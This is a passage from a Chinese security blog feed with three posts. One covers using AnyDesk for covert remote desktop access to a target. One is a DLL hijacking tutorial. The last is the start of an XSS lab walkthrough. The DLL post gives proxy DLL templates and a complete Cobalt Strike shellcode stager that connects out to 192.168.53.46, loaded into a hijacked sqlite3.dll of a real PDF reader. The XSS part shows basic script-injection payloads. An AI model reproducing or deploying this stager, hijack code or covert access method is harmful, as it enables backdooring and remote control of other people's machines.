class="hljs-number">4</span>个文件上传到目标的c:\Users\&#123;目标在线的用户&#125;\AppData\Roaming\AnyDesk目录下。<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/image-20240107165918098.png" alt="image-20240107165918098"><br>将AnyDesk也上传到目标服务器（任意目录都行，最好修改一下文件名）。然后以在线的那个用户的权限去执行AnyDesk这个程序。最后删除本机的前四个文件配置文件（不删除就相当于有两个一样的地址，就不知道是连接的谁），启动本机的AnyDesk输入一开始你AnyDesk的连接地址，连接成功后输入前面设置的密码即可。<br><img src="/2022/06/15/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/image-20240107165927030.png" alt="image-20240107165927030"><br><img src="/2022/06/15/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/image-20240107165936932.png" alt="image-20240107165936932"><br>成功连接</p><p>参考：<a href="https://mp.weixin.qq.com/s/QgCQQMVLGzSIjP-sroiMDw">https://mp.weixin.qq.com/s/QgCQQMVLGzSIjP-sroiMDw</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>3389</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dll劫持</title>
    <link href="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/"/>
    <url>/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/</url>
    
    <content type="html"><![CDATA[<h2 id="dll是什么"><a href="#dll是什么" class="headerlink" title="dll是什么"></a>dll是什么</h2><p>dll为动态链接库文件，又称”应用程序拓展”，是软件文件类型。在Windows中许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库文件，即dll文件，放置于系统中，个人理解类似于我们编程中引入的模块。<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212327100.png" alt="image-20240107212327100"></p><ul><li><p><strong>静态编译</strong>:debug状态下：MTd release状态下：MT</p></li><li><p><strong>动态编译</strong>:debug状态下：MDd release状态下：MD</p><p>  动态编译的生成的可执行文件的exe小，但是运行需要系统环境具有相关的dll和lib文件，就是动态调用系统相关的文件才能运行；</p><p>  静态编译生成的可执行文件exe大，但是运行的时候不依赖于系统环境所依赖的dll和lib等环境问题，在编译的时候已经这些dll相关文件编译进了exe文件，所以exe文件较大。所以需要自己创建的工程需要在别的电脑上运行，考虑到稳定性，同时对执行文件的大小没有要求的话还是尽量选择静态编译。</p></li></ul><h2 id="dll劫持漏洞原理"><a href="#dll劫持漏洞原理" class="headerlink" title="dll劫持漏洞原理"></a>dll劫持漏洞原理</h2><p>如果在一个进程加载dll时没有指定dll的绝对路径，那么windows会尝试去按照顺序搜索这些特定目录来查找这个dll。如果攻击者将恶意的dll放在优先于正常dll所在目录，那么就能够欺骗系统去加载恶意的dll,形成dll劫持。</p><h2 id="DLL路径搜索目录顺序"><a href="#DLL路径搜索目录顺序" class="headerlink" title="DLL路径搜索目录顺序"></a>DLL路径搜索目录顺序</h2><ul><li>程序加载目录</li><li>系统目录。使用GetSystemDirectory获取该路径</li><li>16位系统目录</li><li>windows目录，使用GetWindowsDirectory获取该路径</li><li>windows当前目录</li><li>PATH环境变量中列出的目录</li></ul><h2 id="Know-Dlls注册表项"><a href="#Know-Dlls注册表项" class="headerlink" title="Know Dlls注册表项"></a>Know Dlls注册表项</h2><p>从windows7之后，微软为了更进一步的防御系统的dll劫持，将一些容易被劫持的系统dll写进了一个注册表项中，那么凡是在此项目下的dll文件就会被禁止从exe自身所在目录下调用，而只能从系统目录即system32目录下调用</p><ul><li><strong>默认情况下：</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode<br></code></pre></td></tr></table></figure><p>处于开启状态，如果手动设置为0，关闭该安全选项，搜索顺序为：在以上顺序的基础上，将 当前目录   修改至    系统目录   的位置，其他顺移。</p><p>另外当前应用程序加载dll时如果仅指定dll名称时，那么将按照以上顺序搜索dll文件，不过在加载之前还需要满足以下两条规范：<br>1.当内存中已加载相同模块名称的dll时，系统将直接夹在该dll,不会进行搜索，除非设置了dll重定向选项<br>2.如果要加载的dll模块属于known dlls，系统直接加载系统目录下的该dll，不会进行搜索</p><p>windows操作系统通过”dll路径搜索目录顺序”和“known dlls注册表项”来确定应用程序所要调用的dll的路径，当一个进程尝试加载一个dll的时候，会先尝试搜索程序所处的目录，若还没有找到，则向下搜索16位系统目录即system目录，然后windows目录，当前目录，path环境变量的各个目录。<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212343749.png" alt="image-20240107212343749">这样的加载顺序很容易就会导致一个系统的dll被劫持，只要攻击者将目标文件和恶意dll放在一起即可导致恶意dll搜索顺序优先于系统dll目录加载，就能够欺骗系统去加载恶意的dll，形成”dll劫持”。</p><h2 id="手动劫持"><a href="#手动劫持" class="headerlink" title="手动劫持"></a>手动劫持</h2><ul><li><strong>劫持程序运行时加载的未知dll</strong><br>用到的工具 Process Monitor v3.60<br>通过process monitor监控dll调用是一种最基础的寻找dll劫持的方式<br>设置过滤规则:(默认的不需要改变)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Path ends with .dll<br>Result is NAME NOT FOUND<br>Process Name contains 进程名称<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212400191.png" alt="image-20240107212400191"><br>然后这里找到一个需要用到loadlibrary这个api的dll，这里找有个api的原因是因为如果该dll的调用栈中存在有 **loadlibrary(Ex) * *,说明这个dll被进程所动态加载的。如果这种利用场景下，伪造的dll文件不需要存在任何导出函数即可被成功加载，即使加载后进程内部出错，也是在dll被加载成功加载之后的事情。<br>loadlibrary和loadlibraryex是一个本地加载，一个是远程加载，如果dll不在调用的同一目录下，就可以使用loadlibrary(L”DLL绝对路径”)加载。但是如果DLL内部又调用一个DLL，就需要使用loadlibraryex进行远程加载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">LoadLibraryEx(“DLL绝对路径”, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);<br></code></pre></td></tr></table></figure><p>LoadLibraryEx的最后一个参数设置为load_With_altered_Search_path即可让系统dll搜索顺序从我们设置的目录开始</p><p>找到可以被劫持的dll文件<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212414358.png" alt="image-20240107212414358"><br>编写恶意的dll</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">// dllmain.cpp : 定义 DLL 应用程序的入口点。<br><span class="hljs-comment">#include &quot;pch.h&quot;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><br>BOOL APIENTRY DllMain( HMODULE hModule,<br>                       DWORD  ul_reason_for_call,<br>                       LPVOID lpReserved<br>                     )<br>&#123;<br>    switch (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>    system(<span class="hljs-string">&quot;calc&quot;</span>);<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-built_in">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>用vs创建dll项目，并生成<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212428341.png" alt="image-20240107212428341"><br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212439694.png" alt="image-20240107212439694"></p><ul><li><strong>劫持程序某个功能调用的dll文件</strong><br>某个exe程序运行的时候，监控某个功能(例如截图)所调用的dll文件<br>1.使用CFFExplorer工具查看该文件(dll文件名为B)，导出目录里的kerbel32.dll里是否调用了LoadLibrary<br>2.如果调用了LoadLibrary,则在导出目录找导出的函数名(函数名为C)<br>3.自己编写dll，重命名为B.dll，将原先的B.dll重命名为B_origin.dll。B.dll代码里用LoadLibrary调用B_origin.dll<br>4.运行该程序的某个功能，即可劫持</li></ul><p>代码demo<br>extern导出函数的代码可以用rundll32 dllExtern.dll   test(函数名)  调用extern “C” extern “C”使得在C++中使用c编译方式成为可能。在c++下定义c函数，需要加extern “C”关键字。用extern “C”来指明该函数使用c编译方式。输出的”c”函数可以从”c”代码里调用<br>__declspec(dllexport)的作用就是让编译器按照某种预定的方式来输出导出函数及变量的符号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">动态链接库文件中包含若干公用的代码、数据库等。供其他模块使用。动态链接库是将应用程序模块化的重要方法、动态链接库中的函数和数据可以同时供其他多个可执行文件使用，不同的可执行文件可以调用同一个动态链接库中的函数。DLL中函数经过<span class="hljs-string">&quot;导出&quot;</span>后可以被exe文件中的程序调用<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#include &lt;Windows.h&gt; // 这是导出变量的一个示例 </span><br>extern <span class="hljs-string">&quot;C&quot;</span> _declspec(dllexport) void __cdecl <span class="hljs-built_in">test</span>(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine,int nCmdShow) <br>&#123;<br> WinExec(<span class="hljs-string">&quot;calc.exe&quot;</span>, SW_HIDE);<br>  <span class="hljs-built_in">return</span>; <br>  &#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212448823.png" alt="image-20240107212448823"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#劫持dll的代码模板</span><br><span class="hljs-comment">#假设程序加载的dll名字为B，B.dll的导出函数为C</span><br><span class="hljs-comment">#劫持的dll名字改为B</span><br><span class="hljs-comment">#B.dll改为B_Origin.dll</span><br><span class="hljs-comment">#PrScrn改为C</span><br><span class="hljs-comment">#PrScrn_Origial.dll改为B_Origin.dll</span><br><span class="hljs-comment">#include &lt;Windows.h&gt;</span><br>extern <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) void PrScrn();<br>BOOL APIENTRY DllMain( HMODULE hModule,<br>                       DWORD  ul_reason_for_call,<br>                       LPVOID lpReserved<br>                     )<br>&#123;<br>    switch (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        WinExec(<span class="hljs-string">&quot;calc.exe&quot;</span>, SW_HIDE);            //我们要攻击的恶意代码<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-built_in">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">return</span> TRUE;<br>&#125;<br>void <span class="hljs-function"><span class="hljs-title">PrScrn</span></span>()<br>&#123;<br>    MessageBox(NULL, L<span class="hljs-string">&quot;DLL Hijack! by DLLHijacker!&quot;</span>, L<span class="hljs-string">&quot;:)&quot;</span>, 0);  //我们要攻击的恶意代码<br>    HINSTANCE hDllInst = LoadLibrary(L<span class="hljs-string">&quot;PrScrn_Origial.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (hDllInst)<br>    &#123;<br>        typedef DWORD(WINAPI *EXPFUNC)();<br>        EXPFUNC exportFunc = NULL;<br>        exportFunc = (EXPFUNC)GetProcAddress(hDllInst, <span class="hljs-string">&quot;PrScrn&quot;</span>);<br>        <span class="hljs-keyword">if</span> (exportFunc)<br>        &#123;<br>            exportFunc();<br>        &#125;<br>        FreeLibrary(hDllInst);<br>    &#125;<br>    <span class="hljs-built_in">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>实验：<br>process monitor做以下规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Path ends with .dll<br>Result is SUCCESS<br>Process Name contains 进程名称<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212504092.png" alt="image-20240107212504092"><br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212514420.png" alt="image-20240107212514420"><br>使用CFFExplorer查看目标dll文件<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212529408.png" alt="image-20240107212529408"><br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212544173.png" alt="image-20240107212544173"><br>任选一个函数(存在LoadLibraryExW的dll文件的导出目录如果是多个函数，每个函数都可以劫持！)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#include &lt;Windows.h&gt;</span><br><span class="hljs-comment">#include &quot;pch.h&quot;</span><br>extern <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) void beNotified();<br>BOOL APIENTRY DllMain(<br>HMODULE hModule,<br>DWORD ul_reason_for_call,<br>LPVOID lpReserved<br>) &#123;<br>switch (ul_reason_for_call) &#123;<br><span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>WinExec(<span class="hljs-string">&quot;calc.exe&quot;</span>, SW_HIDE); //我们要攻击的恶意代码 <br><span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br><span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br><span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br><span class="hljs-built_in">break</span>;<br>&#125;<br><span class="hljs-built_in">return</span> TRUE;<br>&#125;<br>void <span class="hljs-function"><span class="hljs-title">beNotified</span></span>() &#123;<br>MessageBox(NULL, L<span class="hljs-string">&quot;DLL Hijack! by DLLHijacker!&quot;</span>, L<span class="hljs-string">&quot;:)&quot;</span>, 0); //我们要攻击的恶意代码 <br>HINSTANCE hDllInst = LoadLibrary(L<span class="hljs-string">&quot;NppCoverter_Origial.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (hDllInst) &#123;<br>typedef DWORD(WINAPI *EXPFUNC)();<br>EXPFUNC exportFunc = NULL;<br>exportFunc = (EXPFUNC)GetProcAddress(hDllInst, <span class="hljs-string">&quot;beNotified&quot;</span>);<br><span class="hljs-keyword">if</span> (exportFunc) &#123;<br>exportFunc();<br>&#125;<br>FreeLibrary(hDllInst);<br>&#125;<br><span class="hljs-built_in">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212606693.png" alt="image-20240107212606693"></p><p>将编译好的文件放到目标dll同目录下，并且重命名为NppCoverter.dll。原先的NppCoverter.dll重命名为NppCoverter_Origial.dll</p><p><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212620386.png" alt="image-20240107212620386"><br>执行程序<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212631851.png" alt="image-20240107212631851"></p><h2 id="aheadlib工具劫持"><a href="#aheadlib工具劫持" class="headerlink" title="aheadlib工具劫持"></a>aheadlib工具劫持</h2><p>这里演示程序为极速pdf<br><a href="https://jisupdf.com/">https://jisupdf.com/</a><br>安装好有得到如下文件<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212644495.png" alt="image-20240107212644495"><br>这里先用cobalt strike生成payload<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212653901.png" alt="image-20240107212653901"><br>设置好监听，然后生成<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212702525.png" alt="image-20240107212702525"><br>打开工具aheadlib,然后这里以sqlite3.dll为例<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212713812.png" alt="image-20240107212713812"></p><p>然后就会生成一个cpp文件<br>新建一个dll项目<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212737718.png" alt="image-20240107212737718"></p><p><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212755280.png" alt="image-20240107212755280">将生成的cpp文件覆盖到dllmain.cpp文件中<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212819125.png" alt="image-20240107212819125"><br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212830055.png" alt="image-20240107212830055"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>unsigned char buf[] = <span class="hljs-string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x90\x1f\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x74\x47\x39\x68\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x41\x55\x29\x0d\x0a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x35\x33\x2e\x34\x36\x00\x00\x00\x00\x00&quot;</span>;<br>void *<span class="hljs-built_in">exec</span> = VirtualAlloc(0,sizeof(buf),MEM_COMMIT,PAGE_EXECUTE_READWRITE);<br>memcpy(<span class="hljs-built_in">exec</span>,buf,sizeof(buf));<br>CreateThread(0, 0, (LPTHREAD_START_ROUTINE)<span class="hljs-built_in">exec</span>, 0, 0, 0);//创建线程运行shellcode<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212846294.png" alt="image-20240107212846294"><br>然后生成文件<br>将生成的dll文件和原dll文件进行替换<br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212857503.png" alt="image-20240107212857503"><br><img src="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/image-20240107212907879.png" alt="image-20240107212907879"><br>注意payload的位数要和生产dll文件的位数一致</p><p>参考链接：<a href="https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/">https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>dll劫持</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss靶场练习</title>
    <link href="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>- Pass-1</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/xss/level1.php?name=&lt;script&gt;<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107172935992.png" alt="image-20240107172935992"><br>通过<br><strong>- Pass-2</strong><br>直接插入不行，引号将其包裹起了<br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107172948140.png" alt="image-20240107172948140"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">http:<span class="hljs-comment">//127.0.0.1/xss/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;--</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107172959302.png" alt="image-20240107172959302"><br><strong>- Pass-3</strong><br>审查元素看看<br><img 